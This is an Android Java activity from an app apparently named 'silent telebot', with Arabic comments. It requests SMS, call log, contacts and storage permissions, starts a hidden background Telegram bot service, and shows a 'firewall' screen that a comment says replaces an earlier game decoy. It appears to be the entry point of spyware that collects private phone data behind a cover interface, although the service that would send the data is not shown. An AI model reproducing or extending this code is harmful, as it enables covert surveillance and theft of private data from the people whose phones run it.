package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.silent.firewall.AppListActivity;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // طلب الأذونات العادية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            };

            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
                return;
            }
        }

        // بدء الخدمة وفتح جدار الحماية
        startServicesAndOpenFirewall();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "✅ جميع الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
            }
            startServicesAndOpenFirewall();
        }
    }

    private void startServicesAndOpenFirewall() {
        // 1. بدء خدمة البوت الخلفية
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // 2. فتح واجهة جدار الحماية (بدلاً من اللعبة)
        Intent firewallIntent = new Intent(this, AppListActivity.class);
        startActivity(firewallIntent);

        // 3. إنهاء النشاط الحالي (لا داعي لبقائه)
        finish();
    }
                                                  }
